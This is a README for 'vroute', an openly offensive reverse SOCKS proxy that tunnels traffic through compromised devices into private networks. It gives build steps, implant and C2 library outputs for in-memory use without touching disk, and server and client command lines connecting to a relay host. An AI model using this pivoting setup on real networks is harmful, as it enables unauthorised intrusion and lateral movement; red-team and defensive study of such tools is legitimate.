# vroute

Reverse SOCKS proxy through HTTP(S) for network pivoting

## Introduction

Project allowing operators to use compromised devices in offensive network operations to route traffic into private network for which there is no direct access otherwise.

This project has two main parts:

- **Server**: Binds a SOCKS proxy and a relay server

- **Client**: Connects to server relay server

The SOCKS proxy is where we poing the SOCKS proxy client (Eg.: using proxychains), and where we route OST traffic to.

The relay server acts as a middleman between compromised devices and the SOCKS proxy client, which ultimately allows the SOCKS proxy client to reach network destinations that the compromised nodes have access to.

Compiles ELF and DLL shared libraries to be plugged in your implants for easy use of the client in memory without touching disk (Eg.: check [https://github.com/lockedbyte/so_loader](https://github.com/lockedbyte/so_loader)).

## Installing

Dependencies:

- Mingw GCC
- libopenssl dev

Command:

```bash
sudo apt-get install gcc-mingw-w64
sudo apt-get install libssl-dev
```

## Compiling

DEBUG mode (debug strings, logging, symbols...):

```bash
./compile.sh debug
```

RELEASE mode (no debug strings, no logging, symbol stripping ...):

```bash
./compile release
```

DEV mode (debug strings, logging, symbols, ASAN ...):

```bash
./compile dev
```

The compilation will leave the following output files:

Server:

- `vroutesrv`: Server command line ELF executable (run server from shell)
- `libvroute_server.so`: Shared library for server (Eg.: plug VROUTE server to your C2)

Client:

- `vrouteclt`: Client command line ELF executable (run client from shell - not recommended, leaves many traces)
- `libvroute_client.so`: Shared library for client (Eg.: plug VROUTE client into your implant)

Windows support (only client):

- `vrouteclt.exe`: Microsoft Windows PE executable version of command line client
- `libvroute_client.dll`: Microsoft Windows DLL version of shared library client


## Usage

### Server

Server command line:

```
==== { VROUTE SERVER: USAGE } ===

[0] => HTTPS protocol
[1] => HTTP protocol
[2] => Raw TCP protocol

./vroutesrv <proxy ip> <proxy port> <relay ip> <relay port> <protocol> <password> <cert path (if https)>

  Eg.: ./vroutesrv 0.0.0.0 1080 0.0.0.0 1337 1 p@ssw0rd1234#

```

Server shared library entrypoint:

```c
int start_socks4_rev_proxy(char *proxy_host, int proxy_port, char *relay_host, int relay_port, proto_t proto, char *key, size_t key_sz, char *cert_file, int *err);
```

Force server close:

```c
void socks4_rev_close_srv(void);
```

### Client

Client command line:

```
==== { VROUTE CLIENT: USAGE } ===

[0] => HTTPS protocol
[1] => HTTP protocol
[2] => Raw TCP protocol

./vrouteclt <relay ip> <relay port> <protocol> <password>

  Eg.: ./vroutectl 1.2.3.4 1337 0 p@ssw0rd1234#

```

Client shared library entrypoint:

```c
int start_relay_conn(char *host, int port, proto_t proto, char *key, size_t key_sz);
```










